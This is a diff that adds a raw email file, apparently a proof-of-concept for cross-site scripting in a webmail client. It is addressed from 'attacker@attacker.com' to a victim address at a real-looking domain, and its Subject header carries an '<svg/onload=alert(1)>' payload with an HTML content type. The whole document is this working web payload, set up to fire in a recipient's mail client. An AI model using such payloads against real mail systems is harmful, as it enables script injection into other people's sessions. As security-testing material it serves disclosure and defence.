@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: <svg/onload=alert(1)>
+To: victim@cntv.cn
+MIME-Version: 1.0
+Content-type: text/html
+
+content has some filter.
